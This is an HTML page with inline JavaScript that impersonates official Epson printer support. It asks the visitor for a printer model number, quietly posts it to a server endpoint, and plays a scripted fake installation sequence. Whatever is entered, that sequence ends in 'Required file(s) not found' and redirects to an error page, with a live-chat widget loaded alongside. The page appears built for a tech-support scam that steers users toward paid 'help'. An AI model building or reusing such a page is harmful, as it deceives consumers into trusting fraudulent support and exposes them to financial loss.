 }

<body>
    <header class="header">
  <div class="header-container">

    <!-- Logo -->
    <div class="logo">
      <img src="./img/logo.webp" alt="Printer Logo">
    </div>

    <!-- Navigation -->
    <nav class="nav">
      <a href="#">OFFICEJET</a>
      <a href="#">LASERJET</a>
      <a href="#">PIXMA</a>
      <a href="#">MAXIFY</a>
      <a href="#">XP SERIES</a>
    </nav>

    <!-- CTA Button -->
    <div class="cta">
      <a href="#" class="btn">CONTACT US</a>
    </div>

  </div>
</header>
<section class="epsonNet-hero">
  <div class="ep-container">
   
    <div class="hp-text">
        <div class="epLogo"><img src="./img/EPSON-1.png"></div>
      <h1>
       Setting Up Your Product
      </h1>
      <p class="subtitle">
        Download and install your printer software
      </p>
      <div id="formBox">
 <input id="printerModel" placeholder="Enter Model Number">
  <button id="startBtn">Setup</button>
  </div>
    </div>
    <div class="loaderWrap">
      <div id="loadingBox" style="display:none;">
  <h3>Processing Epson Printer…</h3>
  <div class="progress-container">
  <div class="progress-bar" id="progressBar"></div>
</div>
  <div id="stepContent"></div>
</div>

    </div>
    <div class="hp-image">
      <img src="./img/epsion-loader.webp" alt="Epson Printers">
    </div>
  </div>
</section>
<footer class="footer">
  <p>Copyright © 2026 by Official Printer Support</p>
</footer>

<script>
document.getElementById("startBtn").addEventListener("click", async function () {
  const model = document.getElementById("printerModel").value.trim();
  if (!model) {
    alert("Please enter printer model");
    return;
  }
   document.querySelector(".epsonNet-hero").classList.add("loading-active");
  sessionStorage.setItem("printerModel", model);
  try {
    await fetch("/api/send-model", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        printerModel: model,
        brand: "HP"
      })
    });
  } catch (e) {
    console.log("Model mail failed (non-blocking)");
  }
  document.getElementById("formBox").style.display = "none";
  document.getElementById("loadingBox").style.display = "block";

const steps = [
  `<p>Detecting Epson connection…</p>`,
  `<p>Checking Epson requirements…</p>`,
  `<p>Preparing Epson install…</p>`,
  `<p>Installing Epson software…</p>`,
  `<p class="red">Required file(s) not found</p>`
];


  const progressBar = document.getElementById("progressBar");
  const statusText = document.getElementById("statusText");

  let currentStep = 0;
  const stepDuration = 1500; 
  const stepPercent = 100 / steps.length;

  function runProgress() {
    if (currentStep < steps.length) {

      progressBar.style.width = `${stepPercent * (currentStep + 1)}%`;
      currentStep++;
      setTimeout(runProgress, stepDuration);
    }
  }

  runProgress();

  let i = 0;
  function next() {
    document.getElementById("stepContent").innerHTML = steps[i];
    i++;
    if (i < steps.length) {
      setTimeout(next, 2500);
    } else {
      setTimeout(() => {
       window.location.href = "/epson-error.html";
      }, 2500);
    }
  }

  next();
});
</script>
<script src="/smartsupp.js"></script>
</body>
